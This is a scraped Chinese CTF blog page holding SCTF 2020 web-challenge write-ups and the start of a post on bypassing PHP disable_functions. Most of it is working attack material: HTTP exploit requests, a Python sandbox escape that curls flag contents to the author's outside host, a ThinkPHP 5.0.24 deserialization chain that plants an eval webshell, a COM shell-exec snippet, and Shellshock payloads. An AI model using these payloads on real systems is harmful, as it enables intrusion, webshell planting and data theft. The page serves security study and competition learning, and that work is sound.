Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close

{&quot;files&quot;:{&quot;file&quot;:{&quot;path&quot;:&quot;flag&quot;}}}</code></pre><p>æ¥è¿›è¡Œä»»æ„æ–‡ä»¶è¯»å–</p>
<p>SCTF{47cf9489d8832e44312dssxag6f88f45736e0e9c8}</p>
<h2 id="bestlanguage"><a href="#bestlanguage" class="headerlink" title="bestlanguage"></a>bestlanguage</h2><pre><code class="php=">
Route::get(&#39;/&#39;,&quot;IndexController@init&quot;);
Route::post(&#39;/rm&#39;,&quot;IndexController@rm&quot;);
Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
    readfile(&quot;./var/tmp/&quot;.$filename);
})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
Route::post(&#39;/upload&#39;,&quot;IndexController@upload&quot;);
Route::get(&#39;/move/log/{filename}&#39;, &#39;IndexController@moveLog&#39;)-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);
</code></pre>
<pre><code class="php=">&lt;?php


namespace App\Http\Controllers;


class IndexController extends Controller
{
    public function init(){
        if($_SERVER[&quot;REMOTE_ADDR&quot;] !== &quot;127.0.0.1&quot; &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;192.168.&quot;) !== 0 &amp;&amp; strpos($_SERVER[&quot;REMOTE_ADDR&quot;],&quot;10.&quot;) !== 0 )  {
            die(&quot;admin only&quot;);
        }
        if(!file_exists(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]))){
            mkdir(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]));
        }
    }
    public function rm(){
        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
        if(file_exists(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
            if(is_dir(&quot;/var/&quot;.$_POST[&quot;filename&quot;])){
                rmdir(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
                echo &quot;rmdir&quot;;
            }
            else{
                unlink(&quot;/var/&quot;.$_POST[&quot;filename&quot;]);
                echo &quot;unlink&quot;;
            }
        }
    }
    public function upload()
    {

        if(strpos($_POST[&quot;filename&quot;], &#39;../&#39;) !== false) die(&quot;???&quot;);
        file_put_contents(&quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;],base64_decode($_POST[&quot;content&quot;]));
        echo &quot;/var/tmp/&quot;.md5($_SERVER[&quot;REMOTE_ADDR&quot;]).&quot;/&quot;.$_POST[&quot;filename&quot;];
    }

    public function moveLog($filename)
    {

        $data =date(&quot;Y-m-d&quot;);
        if(!file_exists(storage_path(&quot;logs&quot;).&quot;/&quot;.$data)){
            mkdir(storage_path(&quot;logs&quot;).&quot;/&quot;.$data);
        }
        $opts = array(
            &#39;http&#39;=&gt;array(
                &#39;method&#39;=&gt;&quot;GET&quot;,
                &#39;timeout&#39;=&gt;1,//å•ä½ç§’
            )
        );

        $content = file_get_contents(&quot;http://127.0.0.1/tmp/&quot;.md5(&#39;127.0.0.1&#39;).&quot;/&quot;.$filename,false,stream_context_create($opts));
        file_put_contents(storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename,$content);
        echo storage_path(&quot;logs&quot;).&quot;/&quot;.$data.&quot;/&quot;.$filename;
    }
}</code></pre>
<p>storage_path(â€œlogsâ€):/var/www/html/storage/logs</p>
<p>upload dir : /var/tmp/md5(IP)/</p>
<pre><code class="php=">Route::get(&#39;/tmp/{filename}&#39;, function ($filename) {
    readfile(&quot;./var/tmp/&quot;.$filename);
})-&gt;where(&#39;filename&#39;, &#39;(.*)&#39;);</code></pre>
<p>ç›´æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼Œä½†æ˜¯å› ä¸ºä¸¤ä¸ª../æœåŠ¡å™¨ä¸ä¼šè§£æç›´æ¥æŠ¥é”™çš„åŸå› æ— æ³•ç©¿åˆ°æ ¹ç›®å½•ï¼Œåæ¥æƒ³åˆ°åœ¨å¼„ä¸ªindex.phpå°±å¥½äº†<br>æœ€åçš„payload:<a href="http://39.104.93.188/index.php/tmp/../../flag" target="_blank" rel="noopener">http://39.104.93.188/index.php/tmp/../../flag</a></p>
<p>SCTF{B3st_1angu4g3_F0r_Uohhhhhhhhhh1l1l1}</p>
<h2 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h2><h3 id="pysandbox1"><a href="#pysandbox1" class="headerlink" title="pysandbox1"></a>pysandbox1</h3><p>app.py</p>
<pre><code class="python=">from flask import Flask, request

app = Flask(__name__)


@app.route(&#39;/&#39;, methods=[&quot;POST&quot;])
def security():
    secret = request.form[&quot;cmd&quot;]
    for i in secret:
        if not 42 &lt;= ord(i) &lt;= 122: return &quot;error!&quot;

    exec(secret)
    return &quot;xXXxXXx&quot;


if __name__ == &#39;__main__&#39;:
    app.run(host=&quot;0.0.0.0&quot;)
</code></pre>
<p>æµ‹è¯•ç¯å¢ƒï¼š<a href="http://ccreater.top:60011/" target="_blank" rel="noopener">http://ccreater.top:60011/</a><br>ç¦ç”¨å­—ç¬¦ï¼š</p>
<p><code>[&quot;\u0000&quot;, &quot;\u0001&quot;, &quot;\u0002&quot;, &quot;\u0003&quot;, &quot;\u0004&quot;, &quot;\u0005&quot;, &quot;\u0006&quot;, &quot;\u0007&quot;, &quot;\b&quot;, &quot;\t&quot;, &quot;\n&quot;, &quot;\u000b&quot;, &quot;\f&quot;, &quot;\r&quot;, &quot;\u000e&quot;, &quot;\u000f&quot;, &quot;\u0010&quot;, &quot;\u0011&quot;, &quot;\u0012&quot;, &quot;\u0013&quot;, &quot;\u0014&quot;, &quot;\u0015&quot;, &quot;\u0016&quot;, &quot;\u0017&quot;, &quot;\u0018&quot;, &quot;\u0019&quot;, &quot;\u001a&quot;, &quot;\u001b&quot;, &quot;\u001c&quot;, &quot;\u001d&quot;, &quot;\u001e&quot;, &quot;\u001f&quot;, &quot; &quot;, &quot;!&quot;, &quot;\&quot;&quot;, &quot;#&quot;, &quot;$&quot;, &quot;%&quot;, &quot;&amp;&quot;, &quot;&#39;&quot;, &quot;(&quot;, &quot;)&quot;, &quot;{&quot;, &quot;|&quot;, &quot;}&quot;, &quot;~&quot;, &quot;\u007f&quot;]</code></p>
<p>åˆ©ç”¨é­”æœ¯æ–¹æ³•? : <code>__getitem__,__getattr__</code></p>
<p>payload:</p>
<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`cat+flag|base64`&#39;) HTTP/1.1
Host: 39.104.90.30:10006
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://39.104.90.30:10006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
Content-Length: 248

------WebKitFormBoundaryx3B8HB5b
Content-Disposition: form-data; name=&quot;cmd&quot;

request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
------WebKitFormBoundaryx3B8HB5b--</code></pre><h3 id="pysandbox2"><a href="#pysandbox2" class="headerlink" title="pysandbox2"></a>pysandbox2</h3><p>payload:</p>
<pre><code>POST /?a=__import__(&#39;os&#39;).system(&#39;curl+http%3a//ccreater.top%3a60000/+-d+`/readflag|base64`&#39;) HTTP/1.1
Host: 39.104.90.30:10006
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: image/webp,image/apng,image/*,*/*;q=0.8
Referer: http://39.104.90.30:10006/
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryx3B8HB5b
Content-Length: 248

------WebKitFormBoundaryx3B8HB5b
Content-Disposition: form-data; name=&quot;cmd&quot;

request.args.__class__.__getattr__=request.args.__class__.__getitem__;app.config.__class__.__eq__=eval;app.config==request.args.a;
------WebKitFormBoundaryx3B8HB5b--
</code></pre><h3 id="ä¸ºä½•payloadèƒ½è¿è¡Œ"><a href="#ä¸ºä½•payloadèƒ½è¿è¡Œ" class="headerlink" title="ä¸ºä½•payloadèƒ½è¿è¡Œ"></a>ä¸ºä½•payloadèƒ½è¿è¡Œ</h3><p>æˆ‘ä»¬éƒ½çŸ¥é“python è°ƒç”¨ç±»æ–¹æ³•çš„æ—¶å€™ä¼šä¼ å…¥<code>self</code>å‚æ•°ï¼Œè€Œæˆ‘ä»¬è°ƒç”¨<code>app.config==request.args.a</code>åº”è¯¥ä¹Ÿä¼šä¼ å…¥selfå‚æ•°ï¼Œé‚£ä¹ˆä¸ºä»€ä¹ˆè¿™ä¸ªpayloadå¯ä»¥æˆåŠŸ</p>
<p>æµ‹è¯•ä»£ç </p>
<pre><code class="python">class A():
    pass
a = A()
a.__class__.__eq__=eval
a==&quot;print(123)&quot;
</code></pre>
<p>æˆ‘ä»¬è·Ÿè¿›pythonåº•å±‚çœ‹çœ‹</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165243.png" alt="image13796"></p>
<p>è¿™é‡Œæ˜¾ç¤ºnargsæ˜¾ç¤ºåªæœ‰1ä¸ªå‚æ•°ï¼Œå‚çœ‹å †æ ˆï¼Œè·Ÿè¸ªåˆ°æœ€å¼€å§‹çš„åœ°æ–¹</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165459.png" alt="image13916"></p>
<p>è¿™é‡Œæˆ‘ä»¬ç¡®å®ä¼ å…¥äº†self,å…¶ä¸­væ˜¯<code>self</code>,wæ˜¯<code>print(123)</code></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165709.png" alt="image14041"></p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708165753.png" alt="image14125"></p>
<p>åœ¨<code>call_unbound</code>å¤„æˆ‘ä»¬å‘ç°äº†åŸå› ï¼Œæ˜¯å› ä¸ºubound==0</p>
<p>åœ¨<code>lookup_maybe_method</code>ä¸­è®¾ç½®äº†uboundçš„å€¼</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200708170013.png" alt="image14285"></p>
<p><code>#define PyType_HasFeature(t,f)  (((t)-&gt;tp_flags &amp; (f)) != 0)</code></p>
<blockquote>
<p>The difference between bound and unbound is the value of the <code>.__self__</code> attribute (None when unbound). </p>
</blockquote>
<h2 id="UnsafeDefenseSystem"><a href="#UnsafeDefenseSystem" class="headerlink" title="UnsafeDefenseSystem"></a>UnsafeDefenseSystem</h2><p>ThinkPHP V5.0.24</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/SWI66DGX_8Z2Z%7E_%5DOS1M%60W9.jpg" alt="image14584"></p>
<pre><code>http://39.99.41.124/public/log.txt
http://39.99.41.124/public/test/
http://39.99.41.124/public/nationalsb/login.php

</code></pre><p>åœ¨<a href="http://39.99.41.124/public/nationalsb/js/script.jsä¸­å‘ç°è´¦å·å¯†ç ï¼š" target="_blank" rel="noopener">http://39.99.41.124/public/nationalsb/js/script.jsä¸­å‘ç°è´¦å·å¯†ç ï¼š</a></p>
<pre><code>    //username:Admin1964752
    //password:DsaPPPP!@#amspe1221
    //Secret **** is your birthday</code></pre><p>æ–‡ä»¶åŒ…å«:</p>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 39.99.41.124
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 16

file=/etc/passwd</code></pre><pre><code>
Warning&lt;/b&gt;:  include(): Failed opening &#39;php://filter/read=convert.base64-encode/resource=index.php&#39; for inclusion (include_path=&#39;.:/usr/local/lib/php&#39;) in &lt;b&gt;/var/www/html/public/nationalsb/login.php</code></pre><pre><code>GET /public/index.php?s=/index/Index/hello&amp;s3cr3tk3y= HTTP/1.1
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Host: 39.99.41.124
Connection: close
</code></pre><pre><code class="php=">&lt;?php
namespace app\index\controller;

class Index extends \think\Controller{
  public function index(){
      $ip = $_SERVER[&#39;REMOTE_ADDR&#39;];
    echo &quot;Warning&quot;.&quot;&lt;br/&gt;&quot;;
    echo &quot;You IP: &quot;.$ip.&quot; has been recorded by the National Security Bureau.I will record it to ./log.txt, Please pay attention to your behavior&quot;;
    echo &#39;&lt;meta http-equiv=&quot;refresh&quot; content=&quot;1;url=http://127.0.0.1/public/test&quot;&gt;&#39;;  
  }
  public function hello(){
      unserialize(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
    echo(base64_decode($_GET[&#39;s3cr3tk3y&#39;]));
  }
}
</code></pre>
<p>/var/www/html/protect.py</p>
<pre><code class="python=">....</code></pre>
<pre><code class="php=">&lt;?php
namespace think\cache\driver;

class File {
    protected $options = [];
    protected $tag;
    public function __construct() {
    $this-&gt;tag = &#39;cjbtest&#39;;
    $this-&gt;options = [
        &#39;cache_subdir&#39;  =&gt; false,
        &#39;prefix&#39;        =&gt; &#39;&#39;,
        &#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8+&#39;, // å› ä¸º static ç›®å½•æœ‰å†™æƒé™
        &#39;data_compress&#39; =&gt; false
    ];
    }
}

namespace think\session\driver;
use think\cache\driver\File;

class Memcached {
    protected $handler;
    function __construct() {
    $this-&gt;handler=new File();
    }
}

namespace think\console;
use think\session\driver\Memcached;

class Output {
    protected $styles = [];
    private $handle;
    function __construct() {
    $this-&gt;styles = [&quot;getAttr&quot;, &#39;info&#39;,
             &#39;error&#39;,
             &#39;comment&#39;,
             &#39;question&#39;,
             &#39;highlight&#39;,
             &#39;warning&#39;];
    $this-&gt;handle = new Memcached();
    }
}

namespace think\db;
use think\console\Output;

class Query {
    protected $model;
    function __construct() {
    $this-&gt;model = new Output();
    }
}

namespace think\model\relation;
use think\console\Output;
use think\db\Query;

class HasOne {
    public $model;
    protected $selfRelation;
    protected $parent;
    protected $query;
    protected $bindAttr = [];
    public function __construct() {
    $this-&gt;query = new Query(&quot;xx&quot;, &#39;think\console\Output&#39;);
    $this-&gt;model = false;
    $this-&gt;selfRelation = false;
    $this-&gt;bindAttr = [&quot;xx&quot; =&gt; &quot;xx&quot;];
    }}

namespace think\model;
use think\console\Output;
use think\model\relation\HasOne;

abstract class Model {
}

class Pivot extends Model {
    public $parent;
    protected $append = [];
    protected $data = [];
    protected $error;
    protected $model;

    function __construct() {
    $this-&gt;parent = new Output();
    $this-&gt;error = new HasOne();
    $this-&gt;model = &quot;test&quot;;
    $this-&gt;append = [&quot;test&quot; =&gt; &quot;getError&quot;];
    $this-&gt;data = [&quot;panrent&quot; =&gt; &quot;true&quot;];
    }
}

namespace think\process\pipes;
use think\model\Pivot;

class Windows {
    private $files = [];
    public function __construct() {
    $this-&gt;files=[new Pivot()];
    }
}

$obj = new Windows();
$payload = serialize($obj);
echo base64_encode($payload);</code></pre>
<p>å†™æ–‡ä»¶åˆ°/tmp</p>
<pre><code class="python=">import requests
import hashlib
payload=requests.get(&quot;http://127.0.0.1/cms/thinkphp/5.0.24/tp5/public/test.php&quot;).text.strip()
burp0_url = &quot;http://8.208.102.48:80/public/index.php&quot;
params={
    &quot;s&quot;:&quot;/index/Index/hello&quot;,
    &quot;s3cr3tk3y&quot;:payload
}
burp0_headers = {&quot;Authorization&quot;: &quot;Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=&quot;, &quot;Connection&quot;: &quot;close&quot;}
res=requests.get(burp0_url, headers=burp0_headers ,params=params)
print(res.text)
print(requests.get(&quot;http://8.208.102.48:80/public/log.txt&quot;).text)
</code></pre>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 8.208.102.48
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 155

file=php://filter/read=convert.base64-encode/resource=/tmp/PD9waHAgZXZhbCgkX1BPU1RbMV0pOz8%2b743f45ea3d60a1190e3f723595050ca2.php&amp;1=phpinfo();&amp;1=phpinfo();</code></pre><p>å†™åˆ°æ–‡ä»¶é‡Œçš„å†…å®¹</p>
<pre><code>&lt;?php
//000000000000
 exit();?&gt;
s:163:&quot;php://filter/write=convert.base64-encode/resource=../../../../../../../../../../../../../../../../tmp/filenamebfe3467e649d6d158c51b5b5494ca5a2.php&quot;;</code></pre><p>è¿™é‡Œ <a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/php-filter-magic.html</a> é‡Œé¢çš„æ–¹æ³•å·²ç»ä¸ç®¡ç”¨äº†ï¼Œæˆ‘ä»¬éœ€è¦è‡ªå·±æƒ³å‡ºå…¶ä»–åŠæ³•</p>
<p>è¿™é‡Œæˆ‘ä»¬ç”¨<code>php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=</code>æ¥ç»•è¿‡æ­»äº¡exit</p>
<pre><code class="php">    $backdoor = &#39;&lt;?php eval($_POST[1]);?&gt;&#39;;
    $x = str_rot13(base64_encode($payload));
    $payload = base64_decode(str_rot13(base64_encode($backdoor)));
    assert(base64_decode($x) === $backdoor);</code></pre>
<p><code>$dieORexit --convert.base64-encode|string.rot13|convert.base64-decode--&gt; something else</code></p>
<p><code>$payload   --convert.base64-encode|string.rot13|convert.base64-decode--&gt; &#39;&lt;?php eval($_POST[1]);?&gt;&#39;</code> </p>
<p>æœ€åçš„payload:<br><code>&#39;path&#39; =&gt; &#39;php://filter/write=convert.base64-encode|string.rot13|convert.base64-decode/resource=../../../../../../../../../../../../../../../../tmp/t&#39;.urldecode(&quot;%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E&quot;)</code></p>
<pre><code>POST /public/nationalsb/login.php HTTP/1.1
Host: 8.208.102.48
Authorization: Basic QWRtaW4xOTY0NzUyOkRzYVBQUFAhQCNhbXNwZTEyMjE=
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 126

file=%2ftmp%2ft%09%0Fc%9DCm0%A3.%A0%FBq%2BS%82%1FQ%28d%8D%1C%06o%3E743f45ea3d60a1190e3f723595050ca2.php&amp;1=system(&#39;cat /flag&#39;);</code></pre><p><strong>æœ¬æ–‡ä½œè€…</strong>ï¼šccreater<br/><strong>æœ¬æ–‡åœ°å€</strong>ï¼š <a href="http://blog.ccreater.top/2020/07/07/sctf2020/">http://blog.ccreater.top/2020/07/07/sctf2020/</a> <br/><strong>ç‰ˆæƒå£°æ˜</strong>ï¼šæœ¬åšå®¢æ‰€æœ‰æ–‡ç« é™¤ç‰¹åˆ«å£°æ˜å¤–ï¼Œå‡é‡‡ç”¨ BY-NC-SA è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://blog.ccreater.top/2020/07/07/sctf2020/" data-id="ckcblsj910000fwv08vp22raj" data-title="sctf2020" class="article-share-link">Share</a>
      
	  
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>





  
    <article id="post-bypass_disable_function_open_basedir" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/06/30/bypass_disable_function_open_basedir/" class="article-date">
  <time class="dt-published" datetime="2020-06-30T05:23:19.204Z" itemprop="datePublished">2020-06-30</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/web/">web</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/06/30/bypass_disable_function_open_basedir/">bypass_disable_function_open_basedir</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="bypass-disable-function"><a href="#bypass-disable-function" class="headerlink" title="bypass disable_function"></a>bypass disable_function</h1><h2 id="å±é™©å‡½æ•°-ç±»"><a href="#å±é™©å‡½æ•°-ç±»" class="headerlink" title="å±é™©å‡½æ•°/ç±»"></a>å±é™©å‡½æ•°/ç±»</h2><pre><code>FFI
COM
exec
assert
eval
system
ini_set/ini_alter
putenv
imap_open
pcntl_exec
win_shell_execute
dl</code></pre><h2 id="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"><a href="#åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡" class="headerlink" title="åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡"></a>åˆ©ç”¨Windowsç³»ç»Ÿç»„ä»¶COMç»•è¿‡</h2><p>åˆ©ç”¨æ¡ä»¶ï¼š</p>
<pre><code>extension=php_com_dotnet.dll
com.allow_dcom = true
wshom.ocx å­˜åœ¨</code></pre><pre><code class="php">$command = $_GET[&#39;cmd&#39;];
$wsh = new COM(&#39;WScript.shell&#39;); // ç”Ÿæˆä¸€ä¸ªCOMå¯¹è±¡ã€€Shell.Applicationä¹Ÿèƒ½
$exec = $wsh-&gt;exec(&quot;cmd /c&quot;.$command); //è°ƒç”¨å¯¹è±¡æ–¹æ³•æ¥æ‰§è¡Œå‘½ä»¤
$stdout = $exec-&gt;StdOut();
$stroutput = $stdout-&gt;ReadAll();
echo $stroutput;</code></pre>
<h2 id="GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271"><a href="#GNU-Bash-ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´-CVE-2014-6271" class="headerlink" title="GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271"></a>GNU Bash ç¯å¢ƒå˜é‡è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ CVE-2014-6271</h2><blockquote>
<p>   è¢«æ”»å‡»çš„bashå­˜åœ¨æ¼æ´ï¼ˆç‰ˆæœ¬å°äºç­‰äº4.3ï¼‰<br>   æ”»å‡»è€…å¯ä»¥æ§åˆ¶ç¯å¢ƒå˜é‡<br>   æ–°çš„bashè¿›ç¨‹è¢«æ‰“å¼€è§¦å‘æ¼æ´å¹¶æ‰§è¡Œå‘½ä»¤</p>
</blockquote>
<p>åˆ©ç”¨phpçš„mailå‡½æ•°:<a href="https://www.exploit-db.com/exploits/35146" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/35146</a> </p>
<p><a href="https://www.antiy.com/response/CVE-2014-6271.html" target="_blank" rel="noopener">https://www.antiy.com/response/CVE-2014-6271.html</a></p>
<h3 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a><strong>æ¼æ´åŸç†</strong></h3><p>4.3åŠä¹‹å‰çš„bashå¯åŠ¨è§£æç¯å¢ƒå˜é‡æ—¶æœªå¯¹è¾¹ç•Œè¿›è¡Œä¸¥æ ¼çš„é™åˆ¶</p>
<p>â€œ(){â€å¼€å¤´å®šä¹‰çš„ç¯å¢ƒå˜é‡åœ¨å‘½ä»¤ENVä¸­è§£ææˆå‡½æ•°åï¼ŒBashæ‰§è¡Œå¹¶æœªé€€å‡ºï¼Œè€Œæ˜¯ç»§ç»­è§£æå¹¶æ‰§è¡Œshellå‘½ä»¤ã€‚æ ¸å¿ƒçš„åŸå› åœ¨äºåœ¨è¾“å…¥çš„è¿‡æ»¤ä¸­æ²¡æœ‰ä¸¥æ ¼é™åˆ¶è¾¹ç•Œï¼Œæ²¡æœ‰åšåˆæ³•åŒ–çš„å‚æ•°åˆ¤æ–­ã€‚</p>
<p>bashå‡½æ•°çš„æ ¼å¼,è°ƒç”¨å‡½æ•°åªéœ€å˜é‡å+å‚æ•°å³å¯<code>å‡½æ•° å‚æ•°1 å‚æ•°2</code></p>
<pre><code class="bash">funtion ShellShock 
{ echo &quot;Injection&quot;} ShellShock   #è°ƒç”¨è¿™ä¸ªå‡½æ•°</code></pre>
<p>è¿™ä¸ªæ—¶å€™çš„Bashçš„ç¯å¢ƒå˜é‡ï¼š</p>
<pre><code>KEY = ShellShockVALUE = () { echo Injection; }

</code></pre><p>æ¥çœ‹çœ‹ShellShockæ¼æ´çš„çœŸèº«ï¼š</p>
<pre><code class="shell">export ShellShock=&#39;() { :; }; echo;/usr/bin/whoami&#39;
bash&gt;Kr0iN</code></pre>
<p>çœ‹çœ‹ç¯å¢ƒå˜é‡ä½ æœ‰ä»€ä¹ˆ<br><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1229"></p>
<pre><code class="bash">env x=&#39;() { :;}; echo Vulnerable CVE-2014-6271 &#39; bash -c &quot;echo test&quot;</code></pre>
<p><img src="https://i.loli.net/2019/09/11/nhgdTelRLotsjym.png" alt="image1379"></p>
<h3 id="åˆ©ç”¨æ–¹å¼"><a href="#åˆ©ç”¨æ–¹å¼" class="headerlink" title="åˆ©ç”¨æ–¹å¼"></a>åˆ©ç”¨æ–¹å¼</h3><h4 id="phpçš„mailå‡½æ•°"><a href="#phpçš„mailå‡½æ•°" class="headerlink" title="phpçš„mailå‡½æ•°()"></a>phpçš„mailå‡½æ•°()</h4><p>å¦‚æœæœåŠ¡å™¨çš„é»˜è®¤shæ˜¯bash,mailå‡½æ•°ä¼šç”Ÿæˆä¸€ä¸ªbashè¿›ç¨‹,å†ç»“åˆputenv()åˆ©ç”¨ç ´å£³æ¼æ´æ¥å®ç°ä»»æ„å‘½ä»¤æ‰§è¡Œ</p>
<p>ä¼šç”Ÿæˆbashè¿›ç¨‹é™¤äº†mail,phpå‡½æ•°è¿˜æœ‰imap_mailï¼Œå¦‚æœä½ ä»…ä»…é€šè¿‡ç¦ç”¨mailå‡½æ•°æ¥è§„é¿è¿™ä¸ªå®‰å…¨é—®é¢˜ï¼Œé‚£ä¹ˆimap_mailæ˜¯å¯ä»¥åšæ›¿ä»£çš„ã€‚å½“ç„¶ï¼Œphpé‡Œè¿˜å¯èƒ½æœ‰å…¶ä»–åœ°æ–¹æœ‰è°ƒç”¨popenæˆ–å…¶ä»–èƒ½å¤Ÿæ´¾ç”Ÿbashå­è¿›ç¨‹çš„å‡½æ•°ï¼Œé€šè¿‡è¿™äº›åœ°æ–¹ï¼Œéƒ½å¯ä»¥é€šè¿‡ç ´å£³æ¼æ´æ‰§è¡Œå‘½ä»¤çš„ã€‚</p>
<p>æ›´è¯¦ç»†çš„è§£é‡Š:pç‰›çš„<a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p>
<pre><code class="php"># Exploit Title: PHP 5.x Shellshock Exploit (bypass disable_functions)
# Google Dork: none
# Date: 10/31/2014
# Exploit Author: Ryan King (Starfall)
# Vendor Homepage: http://php.net
# Software Link: http://php.net/get/php-5.6.2.tar.bz2/from/a/mirror
# Version: 5.* (tested on 5.6.2)
# Tested on: Debian 7 and CentOS 5 and 6
# CVE: CVE-2014-6271
&lt;pre&gt;
&lt;?php echo &quot;Disabled functions: &quot;.ini_get(&#39;disable_functions&#39;).&quot;\n&quot;; ?&gt;
&lt;?php
function shellshock($cmd) { // Execute a command via CVE-2014-6271 @ mail.c:283
